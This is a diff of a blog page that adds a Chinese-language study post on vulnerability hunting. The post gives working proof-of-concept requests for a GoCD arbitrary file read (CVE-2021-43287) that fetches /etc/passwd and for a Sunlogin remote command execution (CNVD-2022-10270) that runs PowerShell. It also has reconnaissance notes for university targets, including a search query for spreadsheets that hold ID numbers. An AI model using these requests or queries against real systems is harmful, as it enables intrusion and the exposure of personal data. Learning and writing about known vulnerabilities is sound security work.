@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="hole--week3, shiango">
+    <meta name="keywords" content="hole--week3(8.15-8.20), shiango">
     <meta name="description" content="A Freshman">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>hole--week3 | shiango</title>
+    <title>hole--week3(8.15-8.20) | shiango</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">hole--week3</h1>
+                    <h1 class="description center-align post-title">hole--week3(8.15-8.20)</h1>
                 </div>
             </div>
         </div>
@@ -430,9 +430,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">No tag</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
+                                <span class="chip bg-color">漏洞挖掘</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -465,7 +469,50 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><h2 id="1-web服务器漏洞"><a href="#1-web服务器漏洞" class="headerlink" title="1.web服务器漏洞"></a>1.web服务器漏洞</h2><h3 id="GoCD-plugin-任意文件读取漏洞-CVE-2021-43287"><a href="#GoCD-plugin-任意文件读取漏洞-CVE-2021-43287" class="headerlink" title="GoCD plugin 任意文件读取漏洞 CVE-2021-43287"></a>GoCD plugin 任意文件读取漏洞 CVE-2021-43287</h3><p>GoCD plugin aip 参数中的 pluginName 参数存在任意文件读取漏洞，导致攻击者可以获取服务器中的任意敏感信息</p>
+<p>poc：/go/add-on/business-continuity/api/plugin?folderName=&amp;pluginName=../../../etc/passwd</p>
+<p><img src="/images/GoCD%20plugin.png" alt="GoCD plugin"></p>
+<h3 id="2-服务器应用漏洞"><a href="#2-服务器应用漏洞" class="headerlink" title="2.服务器应用漏洞"></a>2.服务器应用漏洞</h3><h4 id="向日葵-check-远程命令执行漏洞-CNVD-2022-10270"><a href="#向日葵-check-远程命令执行漏洞-CNVD-2022-10270" class="headerlink" title="向日葵 check 远程命令执行漏洞 CNVD-2022-10270"></a>向日葵 check 远程命令执行漏洞 CNVD-2022-10270</h4><p>漏洞描述</p>
+<p>具体参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/peace-and-romance/p/15905365.html">https://www.cnblogs.com/peace-and-romance/p/15905365.html</a></p>
+<p>向日葵通过发送特定的请求获取CID后，可调用 check接口实现远程命令执行，导致服务器权限被获取</p>
+<p>漏洞影响：11.0.0.33162</p>
+<p>向日葵在开启后会默认在 40000-65535 之间开启某端口</p>
+<p>这里可以通过发送请求获取CID</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/rpc?action=verify-haras</span><br></pre></td></tr></table></figure>
+
+<p>使用获取到的 verify_string 作为 cookie的 CID字段，进行命令执行</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1<span class="number">.0</span>%2Fpowershell.exe+ipconfig</span><br></pre></td></tr></table></figure>
+
+<p>这里我就直接用工具探测了：<a target="_blank" rel="noopener" href="https://github.com/Mr-xn/sunlogin_rce/releases/tag/new%EF%BC%8C%E4%BD%86%E6%98%AF%E8%BF%99%E4%B8%AA%E6%88%91%E7%BF%BB%E4%BA%86%E4%BA%94%E5%85%AD%E9%A1%B5%E7%9B%AE%E5%89%8D%E8%BF%98%E6%B2%A1%E6%89%BE%E5%88%B0">https://github.com/Mr-xn/sunlogin_rce/releases/tag/new，但是这个我翻了五六页目前还没找到</a></p>
+<h3 id="3-edu挖掘"><a href="#3-edu挖掘" class="headerlink" title="3.edu挖掘"></a>3.edu挖掘</h3><p>信息搜集</p>
+<p>dns解析</p>
+<p>域传输解析漏洞：就是会回显nslookup进入，goolge搜索</p>
+<p>域名：</p>
+<p>备案号：icp,查询有关资产</p>
+<p>whois:反查，站长</p>
+<p>子域名搜寻</p>
+<p>1.网站  这个？在线网站</p>
+<p>2.ssh证书：crt.sh，扩大攻击面范围</p>
+<p>查询子域名</p>
+<p>3.谷歌语法：site：edu.cn filetype:xls 身份证</p>
+<p>4.资产测绘引擎：hunter 数据教权</p>
+<p>5.威胁情报：ip子域名</p>
+<p>6.oneforall</p>
+<p>7.子域名泛解析：</p>
+<p>8.cdn绕过</p>
+<p>查询子域名</p>
+<p>邮件服务器</p>
+<p>ssl证书配置错误</p>
+<p>国外服务器去ping，多地ping</p>
+<p>fofa等搜索</p>
+<p>nslookup 去查，如果有两个ip回显</p>
+<p>搜寻ip的话：</p>
+<p>天眼查：网站备案</p>
+<p>股东：50%</p>
+<p>找到的子域名，全端口扫描，指纹识别</p>
+<p>灯塔</p>
+<p>浏览器 Hack-Tools ,</p>
+
                 
             </div>
             <hr/>
@@ -528,7 +575,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">No tag</span>
+                            
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
+                                    <span class="chip bg-color">漏洞挖掘</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
